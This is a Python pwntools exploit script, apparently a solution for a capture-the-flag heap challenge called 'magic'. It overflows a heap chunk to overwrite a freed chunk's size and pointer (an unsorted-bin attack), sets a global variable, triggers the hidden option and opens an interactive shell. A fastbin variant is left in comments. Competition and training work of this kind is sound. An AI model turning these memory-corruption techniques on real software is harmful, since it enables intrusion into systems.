from pwn import *

p = process('./magic')
# p = remote('node4.buuoj.cn', 29202)
elf = ELF('./magic')
lib = ELF('/home/hututu/tools/glibc-all-in-one/libs/2.23-0ubuntu11_amd64/libc-2.23.so')


def add(size_, mess):
    p.recvuntil(b'Your choice :')
    p.sendline(b'1')
    p.recvuntil(b'Size of Heap :')
    p.sendline(size_)
    p.recvuntil(b'Content of heap:')
    p.send(mess)


def edit(id_, size_, mess):
    p.recvuntil(b'Your choice :')
    p.sendline(b'2')
    p.recvuntil(b'Index :')
    p.sendline(id_)
    p.recvuntil(b'Size of Heap :')
    p.sendline(size_)
    p.recvuntil(b'Content of heap :')
    p.send(mess)


def delete(id_):
    p.recvuntil(b'Your choice :')
    p.sendline(b'3')
    p.recvuntil(b'Index :')
    p.sendline(id_)


# add(b'16', b'aaaa')  # 0
# add(b'16', b'aaaa')  # 1
# add(b'16', b'aaaa')  # 2
# add(b'16', b'aaaa')  # 3
# add(b'128', p64(0))  # 4
# delete(b'1')
# delete(b'2')
# payload = p64(0) * 3 + p64(0x21) + p64(0) * 3 + p64(0x21) + p8(0x80)
# edit(b'0', b'65', payload)
# payload = p64(0) * 3 + p64(0x21)
# edit(b'3', b'32', payload)
# add(b'16', b'aaaa')  # 5
# add(b'16', b'aaaa')  # 6
# payload = p64(0) * 3 + p64(0x91)
# edit(b'3', b'32', payload)
# add(b'128', b'a')
# delete(b'4')
# add(b'96', b'a')
# delete(b'4')
# payload = p64(0) * 3 + p64(0x71) + p64(0x60208d)
# edit(b'3', b'40', payload)
# add(b'96', b'a')
# payload = b'a' * 0x3 + p64(0x11306)
# add(b'96', payload)
# p.sendline(b'4869')
add(b'16', b'aaaa')
add(b'128', b'bbbb')
add(b'16', b'cccc')
delete(b'1')
payload = p64(0) * 3 + p64(0x91) + p64(0) + p64(0x6020a0 - 0x10)
edit(b'0', b'48', payload)
add(b'128', p64(0x1306))
# gdb.attach(p)
p.sendline(b'4869')
p.interactive()
